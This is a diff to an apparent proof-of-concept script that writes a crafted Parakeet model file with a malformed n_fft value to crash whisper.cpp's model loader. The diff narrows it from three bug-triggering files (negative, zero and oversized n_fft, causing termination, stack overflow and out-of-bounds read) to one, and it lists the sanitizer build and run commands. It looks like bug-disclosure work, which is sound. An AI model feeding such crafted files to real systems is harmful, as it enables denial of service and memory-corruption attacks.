@@ -1,14 +1,12 @@
 """
-Generates three crafted Parakeet model files that trigger the three
-n_fft validation bugs in ggml-org/whisper.cpp src/parakeet.cpp.
+Generates a crafted Parakeet model file that triggers the n_fft
+validation bug in ggml-org/whisper.cpp src/parakeet.cpp.
 
 Run:  python3 make_poc_final.py
 Test: g++ -g -O0 -fsanitize=address run_poc.cpp -o run_poc \
           -L<build>/bin -lwhisper -lggml -lggml-base -lggml-cpu \
           -Wl,-rpath,<build>/bin -Iinclude -Iggml/include
-      LD_LIBRARY_PATH=<build>/bin ./run_poc poc_nfft_neg1.bin   # Bug 1: terminate
-      LD_LIBRARY_PATH=<build>/bin ./run_poc poc_nfft_zero.bin   # Bug 2: ret valid ctx (crash at inference)
-      LD_LIBRARY_PATH=<build>/bin ./run_poc poc_nfft_46349.bin  # Bug 3: ret valid ctx (OOB at inference)
+      LD_LIBRARY_PATH=<build>/bin ./run_poc poc_nfft_neg1.bin   # terminate at model load
 
 File format:
   GGML magic (4) | 15x hparams int32 | mel_filters (12) | window_n=0 (4) |
@@ -52,6 +50,4 @@ def make_model(n_fft_value, filename):
         f.write(buf)
     print(f"[+] wrote {filename} ({len(buf)} bytes)  n_fft={n_fft_value}")
 
-make_model(-1,    "poc_nfft_neg1.bin")   # Bug 1: std::terminate at model load
-make_model(0,     "poc_nfft_zero.bin")   # Bug 2: valid ctx, stack-overflow at inference
-make_model(46349, "poc_nfft_46349.bin")  # Bug 3: valid ctx, OOB read at inference
+make_model(-1, "poc_nfft_neg1.bin")   # std::terminate at model load
